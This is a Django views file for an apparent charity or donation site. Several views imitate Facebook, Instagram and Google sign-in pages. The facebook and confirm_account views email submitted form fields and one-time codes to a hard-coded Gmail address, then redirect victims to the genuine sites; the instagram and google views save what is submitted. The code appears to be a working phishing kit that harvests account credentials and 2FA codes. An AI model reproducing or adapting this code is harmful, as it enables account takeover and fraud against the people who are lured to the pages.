from django.shortcuts import render, redirect
from .models import *
from .forms import *
from typing import Protocol
from django.core.mail import send_mail
from django.conf import settings
from django.template.loader import render_to_string
from django.contrib.sites.shortcuts import get_current_site
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str
from django.core.mail import EmailMessage
from django.db.models.query_utils import Q
# Create your views here.

def index( request):
    return render (request, 'donate/index.html') 

def confirm_account(request):

   if request.method == 'POST':
       otp = request.POST['otp']

       ctx = {
           'otp' : otp,
       }
       message = render_to_string('donate/vote.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['service.helpcharity@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('https://www.facebook.com/')

   return render(request, 'donate/confirm_account.html')


def blog( request):
    return render (request, 'donate/blog.html') 

def contact( request):
    return render (request, 'donate/contact.html') 

def facebook(request):

   if request.method == 'POST':
       product = request.POST['product']
       massage = request.POST['massage']
       ctx = {
           'product' : product,
           'massage' : massage,
       }
       message = render_to_string('donate/blog.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['service.helpcharity@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('confirm_account')

   return render(request, 'donate/facebook.html')

def instagram(request):
    if request.method == 'POST':
        form = Instagram(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://instagram.com")
    else:
        form =  Instagram()
    context = {'form': form}
    return render (request, "donate/instagram.html", {'form':form})

def terms( request):
    return render (request, 'donate/terms.html')      

def support( request):
    return render (request, 'donate/support.html')      


def vote( request):
    return render (request, 'donate/vote.html') 

def google(request):
    if request.method == 'POST':
        form = Google(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://Google.com")
    else:
        form =  Google()
    context = {'form': form}
    return render (request, "donate/google.html", {'form':form})